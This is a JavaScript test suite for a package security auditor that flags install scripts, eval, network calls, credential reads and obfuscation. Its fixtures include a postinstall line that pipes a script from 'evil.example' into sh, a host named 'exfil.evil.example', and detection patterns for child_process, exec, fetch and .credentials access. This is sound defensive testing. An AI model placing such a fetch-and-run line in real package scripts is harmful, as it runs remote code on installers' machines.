import assert from 'node:assert/strict'
import { mkdtemp, mkdir, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { test } from 'node:test'
import { fileURLToPath } from 'node:url'

import {
  SEVERITY_ORDER,
  SEVERITY_WEIGHT,
  analyzeSources,
  auditDirectory,
  scoreFindings,
} from '../lib/audit.js'

const HERE = dirname(fileURLToPath(import.meta.url))
const FIXTURES = join(HERE, 'fixtures', 'audit')
const CLEAN = join(FIXTURES, 'clean')
const MALICIOUS = join(FIXTURES, 'malicious')
const SPARSE = join(FIXTURES, 'sparse')
const BOUNDS = join(FIXTURES, 'bounds')

const PERMISSION_KEYS = [
  'childProcess',
  'credentials',
  'eval',
  'filesystemWrite',
  'installScripts',
  'nativeAddons',
  'network',
  'obfuscated',
  'patchesShippedRows',
  'sparseSource',
]

async function makeTempDir(prefix = 'dsh-audit-test-') {
  return mkdtemp(join(tmpdir(), prefix))
}

async function writePackage(dir, manifest, extras = {}) {
  await writeFile(join(dir, 'package.json'), `${JSON.stringify(manifest, null, 2)}\n`)
  for (const [name, text] of Object.entries(extras)) {
    await mkdir(dirname(join(dir, name)), { recursive: true })
    await writeFile(join(dir, name), text)
  }
}

/** Determinism comparison: everything except the wall-clock timestamp. */
function withoutTimestamp(audit) {
  const copy = structuredClone(audit)
  delete copy.stats.scannedAt
  return copy
}

function locatedFindings(findings) {
  return findings.filter((finding) => finding.file !== undefined)
}

test('exposes the frozen severity vocabulary and weights', () => {
  assert.deepEqual(SEVERITY_ORDER, ['critical', 'high', 'medium', 'low', 'info'])
  assert.deepEqual(SEVERITY_WEIGHT, { critical: 45, high: 20, medium: 8, low: 3, info: 0 })
})

test('clean package audits as safe with informational findings only', async () => {
  const audit = await auditDirectory(CLEAN)

  assert.equal(audit.evidenceLevel, 'static')
  assert.equal(audit.target, resolve(CLEAN))
  assert.equal(audit.verdict, 'safe')
  assert.ok(audit.score >= 80, `expected score >= 80, got ${audit.score}`)
  for (const finding of audit.findings) assert.equal(finding.severity, 'info', finding.kind)

  assert.deepEqual(Object.keys(audit.permissions).sort(), PERMISSION_KEYS)
  assert.equal(audit.permissions.installScripts, false)
  assert.equal(audit.permissions.childProcess, false)
  assert.equal(audit.permissions.eval, false)
  assert.equal(audit.permissions.filesystemWrite, false)
  assert.equal(audit.permissions.obfuscated, false)
  assert.deepEqual(audit.permissions.network, [])
  assert.deepEqual(
    { files: audit.stats.files, dependencies: audit.stats.dependencies },
    { files: 2, dependencies: 0 },
  )
  assert.ok(audit.stats.bytes > 0)
  assert.ok(Number.isFinite(audit.stats.scannedAt))
})

test('malicious package is unsafe and reports install/eval/network capability', async () => {
  const audit = await auditDirectory(MALICIOUS)

  assert.equal(audit.verdict, 'unsafe')
  assert.ok(audit.score < 40, `expected score < 40, got ${audit.score}`)
  assert.ok(audit.findings.some((finding) => finding.severity === 'critical'), 'expected a critical finding')

  const kinds = new Set(audit.findings.map((finding) => finding.kind))
  for (const kind of ['installScripts', 'eval', 'network', 'childProcess', 'filesystemWrite', 'obfuscation']) {
    assert.ok(kinds.has(kind), `expected a ${kind} finding`)
  }

  const installFinding = audit.findings.find((finding) => finding.kind === 'installScripts' && finding.title.includes('postinstall'))
  assert.ok(installFinding, 'expected the postinstall finding')
  assert.equal(installFinding.severity, 'critical')
  assert.equal(installFinding.file, 'package.json')
  assert.ok(installFinding.line > 0)

  assert.equal(audit.permissions.installScripts, true)
  assert.equal(audit.permissions.eval, true)
  assert.equal(audit.permissions.childProcess, true)
  assert.equal(audit.permissions.filesystemWrite, true)
  assert.equal(audit.permissions.obfuscated, true)
  assert.deepEqual(audit.permissions.network, ['exfil.evil.example'])

  // Every finding that points at a file also links to a line for the panel.
  for (const finding of locatedFindings(audit.findings)) {
    assert.ok(Number.isInteger(finding.line) && finding.line > 0, `${finding.kind} has no line`)
  }
  for (const finding of audit.findings) {
    if (finding.evidence !== undefined) {
      assert.ok(finding.evidence.length <= 240, `${finding.kind} evidence is ${finding.evidence.length} chars`)
    }
    assert.match(finding.id, /^f-\d{3}$/)
  }
})

test('package without package.json still audits and reports an info finding', async () => {
  const audit = await auditDirectory(SPARSE)
  assert.equal(audit.evidenceLevel, 'static')
  assert.ok(audit.findings.some((finding) => finding.severity === 'info'))
  const manifestFinding = audit.findings.find((finding) => finding.title.includes('manifest'))
  assert.ok(manifestFinding, 'expected a missing-manifest finding')
  assert.equal(manifestFinding.kind, 'sparseSource')
  assert.ok(audit.score >= 0 && audit.score <= 100)
})

test('output is deterministic except for stats.scannedAt', async () => {
  const first = await auditDirectory(MALICIOUS)
  const second = await auditDirectory(MALICIOUS)
  assert.notEqual(first.stats.scannedAt, undefined)
  assert.deepEqual(withoutTimestamp(first), withoutTimestamp(second))
  assert.equal(
    first.findings.map((finding) => finding.id).join(','),
    second.findings.map((finding) => finding.id).join(','),
  )
})

test('skips node_modules children', async () => {
  const audit = await auditDirectory(BOUNDS)
  assert.equal(audit.findings.some((finding) => finding.kind === 'eval'), false)
  for (const finding of audit.findings) {
    assert.doesNotMatch(finding.file ?? '', /node_modules/)
  }
  assert.equal(audit.stats.files, 2)
})

test('honours maxFiles and maxBytes bounds', async () => {
  const dir = await makeTempDir()
  try {
    await writePackage(dir, {
      name: 'bounds-fixture',
      version: '1.0.0',
      private: true,
      license: 'MIT',
    }, {
      'big.js': `eval('process.exit(1)')\n// ${'x'.repeat(4096)}\n`,
    })

    const limited = await auditDirectory(dir, { maxBytes: 1024 })
    assert.equal(limited.findings.some((finding) => finding.file === 'big.js'), false)
    assert.equal(limited.stats.files, 1)

    const full = await auditDirectory(dir)
    assert.ok(full.findings.some((finding) => finding.kind === 'eval' && finding.file === 'big.js'))

    const capped = await auditDirectory(dir, { maxFiles: 1 })
    assert.equal(capped.stats.files, 1)
    assert.equal(capped.findings.some((finding) => finding.kind === 'eval'), false)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
})

test('skips binary files', async () => {
  const dir = await makeTempDir()
  try {
    await writePackage(dir, {
      name: 'binary-fixture',
      version: '1.0.0',
      private: true,
      license: 'MIT',
    })
    const binary = Buffer.concat([
      Buffer.from("eval('process.exit(1)')\n"),
      Buffer.from([0, 1, 2, 3, 4, 5]),
    ])
    await writeFile(join(dir, 'blob.js'), binary)

    const audit = await auditDirectory(dir)
    assert.equal(audit.findings.some((finding) => finding.file === 'blob.js'), false)
    assert.equal(audit.stats.files, 1)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
})

test('never follows a symlink that leaves the audit root', async (t) => {
  const root = await makeTempDir('dsh-audit-root-')
  const outside = await makeTempDir('dsh-audit-outside-')
  try {
    await writePackage(root, {
      name: 'symlink-fixture',
      version: '1.0.0',
      private: true,
      license: 'MIT',
    })
    await writeFile(join(outside, 'evil.js'), "eval('process.exit(1)')\n")
    try {
      await symlink(outside, join(root, 'linked'), 'junction')
    } catch {
      t.skip('symlinks are not available on this host')
      return
    }

    const audit = await auditDirectory(root)
    assert.equal(audit.findings.some((finding) => finding.kind === 'eval'), false)
    assert.equal(audit.stats.files, 1)
  } finally {
    await rm(root, { recursive: true, force: true })
    await rm(outside, { recursive: true, force: true })
  }
})

test('missing directory never throws and yields an unknown verdict with empty permissions', async () => {
  const missing = join(tmpdir(), `dsh-audit-missing-${process.pid}-${Date.now()}`)
  const audit = await auditDirectory(missing)
  assert.equal(audit.evidenceLevel, 'static')
  assert.equal(audit.verdict, 'unknown')
  assert.ok(Array.isArray(audit.findings))
  assert.deepEqual(Object.keys(audit.permissions).sort(), PERMISSION_KEYS)
  assert.deepEqual(audit.permissions.network, [])
  assert.deepEqual(audit.stats, { files: 0, bytes: 0, dependencies: 0, scannedAt: audit.stats.scannedAt })
})

test('scoreFindings caps each severity band and forces critical to unsafe', () => {
  assert.deepEqual(scoreFindings([], {}), { score: 100, verdict: 'safe' })
  assert.deepEqual(scoreFindings([{ severity: 'info' }], {}), { score: 100, verdict: 'safe' })

  const fourHighs = Array.from({ length: 4 }, () => ({ severity: 'high' }))
  assert.deepEqual(scoreFindings(fourHighs, {}), { score: 70, verdict: 'caution' })

  const mixed = scoreFindings([
    { severity: 'high' },
    { severity: 'medium' },
    { severity: 'low' },
  ], {})
  assert.deepEqual(mixed, { score: 69, verdict: 'caution' })

  const unsafeBoundary = scoreFindings([
    { severity: 'high' },
    { severity: 'high' },
    { severity: 'medium' },
    { severity: 'low' },
  ], {})
  assert.deepEqual(unsafeBoundary, { score: 59, verdict: 'unsafe' })

  const critical = scoreFindings([{ severity: 'critical' }], {})
  assert.equal(critical.verdict, 'unsafe')
  assert.ok(critical.score <= 39)

  const oneOfEach = scoreFindings([
    { severity: 'critical' },
    { severity: 'high' },
    { severity: 'medium' },
    { severity: 'low' },
  ], {})
  assert.equal(oneOfEach.score, 24)
  assert.equal(oneOfEach.verdict, 'unsafe')
})

test('analyzeSources maps lifecycle severities and extracts only capability hosts', () => {
  const findings = analyzeSources([
    {
      path: 'package.json',
      text: JSON.stringify({
        name: 'in-memory-fixture',
        scripts: {
          postinstall: 'curl -fsSL https://evil.example/a.sh | sh',
          prepare: 'node build.js',
        },
        repository: { type: 'git', url: 'git+https://github.com/example/in-memory-fixture.git' },
      }),
    },
    {
      path: 'lib/net.js',
      text: "export const load = () => fetch('https://api.example.com/data')\n",
    },
  ])

  const postinstall = findings.find((finding) => finding.kind === 'installScripts' && finding.title.includes('postinstall'))
  assert.equal(postinstall.severity, 'critical')
  assert.ok(postinstall.line > 0)
  const prepare = findings.find((finding) => finding.kind === 'installScripts' && finding.evidence.includes('prepare'))
  assert.equal(prepare.severity, 'medium')

  const network = findings.find((finding) => finding.kind === 'network')
  assert.ok(network, 'expected an aggregated network finding')
  assert.equal(network.severity, 'low')
  assert.match(network.detail, /api\.example\.com/)
  assert.doesNotMatch(network.detail, /evil\.example/)
  assert.match(network.evidence, /api\.example\.com/)
  assert.ok(network.line > 0)

  assert.deepEqual(analyzeSources([]), [])
  assert.deepEqual(analyzeSources('not-an-array'), [])
})

test('network hosts are resolved from literals passed to primitives only', () => {
  const findings = analyzeSources([
    {
      path: 'lib/client.js',
      text: [
        "const BASE = 'https://api.example.com'",
        'export async function load() {',
        "  return fetch(`${BASE}/v1/items`)",
        '}',
        "export function ping() {",
        "  return http.request({ hostname: 'internal.example.net', path: '/health' })",
        '}',
        '',
      ].join('\n'),
    },
  ])
  const network = findings.find((finding) => finding.kind === 'network')
  assert.ok(network)
  assert.equal(network.severity, 'low')
  assert.match(network.detail, /api\.example\.com/)
  assert.match(network.detail, /internal\.example\.net/)
})

test('does not treat README, locale JSON or comments as network evidence', () => {
  const findings = analyzeSources([
    { path: 'README.md', text: 'Docs: https://example.com/readme\nRun: curl https://example.com/install\n' },
    { path: 'locale/zh.json', text: JSON.stringify({ text: { link: 'https://example.com/locale' } }) },
    { path: 'lib/a.js', text: '/** Talks to https://example.com/api. */\nexport const answer = 42\n' },
    { path: 'package.json', text: JSON.stringify({ name: 'quiet', homepage: 'https://example.com/quiet' }) },
  ])
  assert.equal(findings.some((finding) => finding.kind === 'network'), false)
})

test('demotes test/fixtures/scripts findings to info and keeps runtime risk', () => {
  const findings = analyzeSources([
    { path: 'lib/runner.js', text: "import { spawn } from 'node:child_process'\nexport const run = () => spawn('sh')\n" },
    { path: 'test/runner.test.mjs', text: "import { spawn } from 'node:child_process'\nexport const run = () => eval('1')\n" },
    { path: 'verify/harness.mjs', text: "import { execSync } from 'node:child_process'\nexecSync('true')\n" },
    { path: 'scripts/build.mjs', text: "import { writeFileSync } from 'node:fs'\nwriteFileSync('x', 'y')\n" },
  ])
  const runtimeChild = findings.find((finding) => finding.kind === 'childProcess' && finding.file === 'lib/runner.js')
  assert.equal(runtimeChild.severity, 'high')
  const testChild = findings.find((finding) => finding.kind === 'childProcess' && finding.file === 'test/runner.test.mjs')
  assert.equal(testChild.severity, 'info')
  const verifyChild = findings.find((finding) => finding.kind === 'childProcess' && finding.file === 'verify/harness.mjs')
  assert.equal(verifyChild.severity, 'info')
  const scriptWrite = findings.find((finding) => finding.kind === 'filesystemWrite' && finding.file === 'scripts/build.mjs')
  assert.equal(scriptWrite.severity, 'info')
  const runtimeEval = findings.find((finding) => finding.kind === 'eval' && finding.file === 'test/runner.test.mjs')
  assert.equal(runtimeEval.severity, 'info')
})

test('credentials: prose words are ignored, env reads aggregate to one info finding', () => {
  const noisy = analyzeSources([
    {
      path: 'lib/notes.js',
      text: [
        '/** Token estimate deliberately matches the Harness heuristic. */',
        "state.lastSkip = 'token meter unavailable'",
        "const description = 'apiKey is optional and token estimate only'",
        'export const answer = 42',
        '',
      ].join('\n'),
    },
    { path: 'locale/zh.json', text: JSON.stringify({ text: { token: '令牌', hint: '使用 token 估算' } }) },
  ])
  assert.equal(noisy.some((finding) => finding.kind === 'credentials'), false)

  const envReads = analyzeSources([
    { path: 'lib/a.js', text: "export const home = process.env.DSH_HOME ?? ''\n" },
    { path: 'lib/b.js', text: "export const root = process.env.DSH_PKG_ROOT ?? ''\n" },
  ])
  const credentialsFindings = envReads.filter((finding) => finding.kind === 'credentials')
  assert.equal(credentialsFindings.length, 1)
  assert.equal(credentialsFindings[0].severity, 'info')
  assert.match(credentialsFindings[0].detail, /2 process\.env read/)
  assert.match(credentialsFindings[0].detail, /lib\/a\.js/)
  assert.match(credentialsFindings[0].detail, /lib\/b\.js/)
})

test('credentials: explicit secret access is one aggregated medium finding', () => {
  const findings = analyzeSources([
    {
      path: 'lib/config.js',
      text: [
        "export const token = process.env.SESSION_SECRET",
        "export const apiKey = process.env['API_KEY']",
        "export const home = process.env.DSH_HOME",
        '',
      ].join('\n'),
    },
    { path: 'lib/auth.js', text: "export const auth = process.env.GITHUB_TOKEN\nexport const header = { Authorization: 'Bearer x' }\n" },
    { path: 'test/secret.test.mjs', text: 'export const value = process.env.SESSION_TOKEN\n' },
  ])
  const credentialsFindings = findings.filter((finding) => finding.kind === 'credentials')
  assert.equal(credentialsFindings.length, 1)
  const finding = credentialsFindings[0]
  assert.equal(finding.severity, 'medium')
  assert.equal(finding.file, 'lib/auth.js')
  assert.ok(finding.line > 0)
  assert.match(finding.detail, /lib\/auth\.js/)
  assert.match(finding.detail, /lib\/config\.js/)
  assert.match(finding.detail, /process\.env\.<secret>/)
  assert.match(finding.detail, /Authorization header/)
})

test('caps evidence excerpts at 240 characters', () => {
  const findings = analyzeSources([
    { path: 'lib/big.js', text: `eval('${'A'.repeat(5000)}')` },
  ])
  const evalFinding = findings.find((finding) => finding.kind === 'eval')
  assert.ok(evalFinding)
  assert.ok(evalFinding.evidence.length <= 240)
  for (const finding of findings) {
    if (finding.evidence !== undefined) assert.ok(finding.evidence.length <= 240)
  }
})

test('flags cordis patch rows the package does not own and lists inserted rows', async () => {
  const dir = await makeTempDir()
  try {
    await writePackage(dir, {
      name: 'patch-owner',
      version: '1.0.0',
      private: true,
      license: 'MIT',
      repository: { type: 'git', url: 'git+https://github.com/example/patch-owner.git' },
    }, {
      'cordis.patch.yml': [
        '- insert:',
        '    - id: patch-owner',
        '      name: patch-owner',
        '- override:',
        '    - id: dsh-host-core',
        '      config: {}',
        '- disable:',
        '    - id: dsh-other-row',
        '',
      ].join('\n'),
    })

    const audit = await auditDirectory(dir)
    const patches = audit.findings.filter((finding) => finding.kind === 'patchesShippedRows')
    const overrideFinding = patches.find((finding) => finding.severity === 'medium' && finding.title.includes('overrides'))
    assert.ok(overrideFinding, 'expected a medium override finding')
    assert.match(overrideFinding.detail, /dsh-host-core/)
    assert.ok(overrideFinding.line > 0)
    const disableFinding = patches.find((finding) => finding.severity === 'medium' && finding.title.includes('disables'))
    assert.ok(disableFinding, 'expected a medium disable finding')
    assert.match(disableFinding.detail, /dsh-other-row/)
    const insertFinding = patches.find((finding) => finding.severity === 'info')
    assert.ok(insertFinding, 'expected an info finding for inserted rows')
    assert.match(insertFinding.detail, /patch-owner/)
    assert.equal(audit.permissions.patchesShippedRows, true)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
})

test('regression: rule-table regex literals are not execution behavior', () => {
  const findings = analyzeSources([
    {
      path: 'lib/rules.js',
      text: [
        'const CHILD_PROCESS_PATTERNS = [',
        '  /\\b(?:node:)?child_process\\b/g,',
        '  /\\bspawn\\s*\\(/g,',
        '  /\\bexec\\s*\\(/g,',
        ']',
        'const CREDENTIAL_PATTERNS = [',
        "  { label: '.credentials', pattern: /\\.credentials\\b/g },",
        ']',
        "const CAPABILITY_TABLE = [{ name: 'fetch(', pattern: /\\bfetch\\s*\\(/g }]",
        'export const value = 1',
        '',
      ].join('\n'),
    },
  ])
  assert.equal(findings.some((finding) => finding.kind === 'childProcess'), false)
  assert.equal(findings.some((finding) => finding.kind === 'credentials'), false)
  assert.equal(findings.some((finding) => finding.kind === 'network'), false)
})

test('regression: atob token inside strings or templates is not obfuscation', () => {
  const stringOnly = analyzeSources([
    {
      path: 'lib/labels.js',
      text: [
        "const label = 'atob('",
        'const message = `${label.length}x atob(`',
        'export const answer = 42',
        '',
      ].join('\n'),
    },
  ])
  assert.equal(stringOnly.some((finding) => finding.kind === 'obfuscation'), false)

  const realCall = analyzeSources([
    { path: 'lib/decode.js', text: "export const decode = (blob) => atob('SGVsbG8gd29ybGQ=')\n" },
  ])
  const obfuscation = realCall.find((finding) => finding.kind === 'obfuscation')
  assert.ok(obfuscation, 'a real atob(...) call must still be flagged')
  assert.equal(obfuscation.severity, 'medium')
  assert.ok(obfuscation.line > 0)
})

test('regression: quoted credentials labels are not secret access', () => {
  const labelsOnly = analyzeSources([
    {
      path: 'lib/labels.js',
      text: [
        "const LABELS = ['.credentials', 'auth.json']",
        "export const credentialLabel = '.credentials'",
        'export const permissionCredential = permissions.credentials',
        'export const answer = 1',
        '',
      ].join('\n'),
    },
  ])
  assert.equal(labelsOnly.some((finding) => finding.kind === 'credentials'), false)

  const realAccess = analyzeSources([
    {
      path: 'lib/vault.js',
      text: [
        "import { readFile } from 'node:fs/promises'",
        "export const read = (home) => readFile(join(home, '.credentials'), 'utf8')",
        '',
      ].join('\n'),
    },
  ])
  const credentials = realAccess.find((finding) => finding.kind === 'credentials')
  assert.ok(credentials, 'a real .credentials file read must still be flagged')
  assert.equal(credentials.severity, 'medium')
})

